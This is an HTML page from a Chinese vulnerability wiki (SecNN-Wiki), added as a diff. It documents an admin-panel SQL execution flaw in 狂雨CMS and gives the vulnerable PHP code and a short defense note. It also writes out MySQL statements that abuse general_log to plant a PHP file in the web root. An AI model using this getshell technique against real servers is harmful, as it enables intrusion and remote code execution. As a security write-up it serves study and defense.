@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8cms/%E7%8B%82%E9%9B%A8CMS%E5%90%8E%E5%8F%B0SQL%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>狂雨CMS后台SQL代码执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u72c2\u96e8CMS\u540e\u53f0SQL\u4ee3\u7801\u6267\u884c", url: "#_top", children: [
+              {title: "\u5ba1\u8ba1", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+              {title: "\u53c2\u8003", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%8B%82%E9%9B%A8CMS%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%8B%82%E9%9B%A8CMS%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/" class="btn btn-xs btn-link">
+        狂雨CMS后台文件包含getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E7%89%A9%E4%B8%9A%E4%B8%93%E9%A1%B9%E7%BB%B4%E4%BF%AE%E8%B5%84%E9%87%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%89%A9%E4%B8%9A%E4%B8%93%E9%A1%B9%E7%BB%B4%E4%BF%AE%E8%B5%84%E9%87%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E7%89%A9%E4%B8%9A%E4%B8%93%E9%A1%B9%E7%BB%B4%E4%BF%AE%E8%B5%84%E9%87%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%89%A9%E4%B8%9A%E4%B8%93%E9%A1%B9%E7%BB%B4%E4%BF%AE%E8%B5%84%E9%87%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        物业专项维修资金管理系统漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="cmssql">狂雨CMS后台SQL代码执行<a class="headerlink" href="#cmssql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">审计<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><code>application/admin/controller/Tool.php-&gt;sqlexecute()</code></p>
+<div class="highlight"><pre><span></span><code><span class="x">public function sqlexecute(){</span>
+<span class="x">        if($this-&gt;request-&gt;isPost()){</span>
+<span class="x">            $sql=$this-&gt;request-&gt;param(&#39;sql&#39;);</span>
+<span class="x">            if(!empty($sql)){</span>
+<span class="x">                $sql = str_replace(&#39;{pre}&#39;,Config::get(&#39;database.prefix&#39;),$sql);</span>
+<span class="x">                //查询语句返回结果集</span>
+<span class="x">                if(strtolower(substr($sql,0,6))==&quot;select&quot;){</span>
+
+<span class="x">                }</span>
+<span class="x">                else{</span>
+<span class="x">                    $return = Db::execute($sql);</span>
+<span class="x">                }</span>
+<span class="x">            }</span>
+<span class="x">            return $this-&gt;success(&#39;执行完成&#39;);</span>
+<span class="x">        }else{</span>
+<span class="x">            $this-&gt;assign(&#39;meta_title&#39;,&#39;SQL语句执行&#39;);</span>
+<span class="x">            return $this-&gt;fetch();</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+</code></pre></div>
+<p>Db是thinkphp内置类，可以看到前六个字符是<code>select</code>的话其实什么都没有执行。。。报错的话无法存入log中，所以用了<code>create</code></p>
+<h3 id="_2">防御方法<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p>针对传入的语句进行限制，比如只能进行查询操作。建议最好还是直接取消这个功能，对SQL的操作直接在服务器上进行，放在后台实在是弊大于利</p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>后台存在SQL代码执行功能</p>
+<p><img alt="mtUfnCEZOR1M7KP" src="../resource/%E7%8B%82%E9%9B%A8CMS%E5%90%8E%E5%8F%B0SQL%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/mtUfnCEZOR1M7KP.png" /></p>
+<p>但<code>secure_file_priv</code>设置为空，无法导出文件，可以利用<code>general_log</code>进行getshell</p>
+<p>依次执行以下代码</p>
+<div class="highlight"><pre><span></span><code><span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">general_log</span><span class="o">=</span><span class="k">On</span><span class="p">;</span>
+<span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">general_log_file</span><span class="o">=</span><span class="s2">&quot;D:</span><span class="se">\\</span><span class="s2">phpstudy_pro</span><span class="se">\\</span><span class="s2">WWW</span><span class="se">\\</span><span class="s2">123.php&quot;</span><span class="p">;</span>
+<span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="p">(</span><span class="k">value</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">25</span><span class="p">));</span>
+<span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="p">(</span><span class="k">value</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="s2">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span><span class="p">);</span>
+<span class="k">drop</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">tmp</span><span class="p">;</span>
+<span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">general_log</span><span class="o">=</span><span class="k">Off</span><span class="p">;</span>
+</code></pre></div>
+<p><img alt="5fiPb2YKw8IlMJX" src="../resource/%E7%8B%82%E9%9B%A8CMS%E5%90%8E%E5%8F%B0SQL%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/5fiPb2YKw8IlMJX.png" /></p>
+<p>得到<code>general_log</code>，内容如图所示</p>
+<p><img alt="rP1bqJAwpymRxLI" src="../resource/%E7%8B%82%E9%9B%A8CMS%E5%90%8E%E5%8F%B0SQL%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rP1bqJAwpymRxLI.png" /></p>
+<p>访问即可看到<code>phpinfo</code></p>
+<h2 id="_4">参考<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p><a href="https://www.cnblogs.com/0daybug/p/12624364.html">https://www.cnblogs.com/0daybug/p/12624364.html</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%8B%82%E9%9B%A8CMS%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%8B%82%E9%9B%A8CMS%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/" class="btn btn-xs btn-link">
+        狂雨CMS后台文件包含getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E7%89%A9%E4%B8%9A%E4%B8%93%E9%A1%B9%E7%BB%B4%E4%BF%AE%E8%B5%84%E9%87%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%89%A9%E4%B8%9A%E4%B8%93%E9%A1%B9%E7%BB%B4%E4%BF%AE%E8%B5%84%E9%87%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E7%89%A9%E4%B8%9A%E4%B8%93%E9%A1%B9%E7%BB%B4%E4%BF%AE%E8%B5%84%E9%87%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%89%A9%E4%B8%9A%E4%B8%93%E9%A1%B9%E7%BB%B4%E4%BF%AE%E8%B5%84%E9%87%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        物业专项维修资金管理系统漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
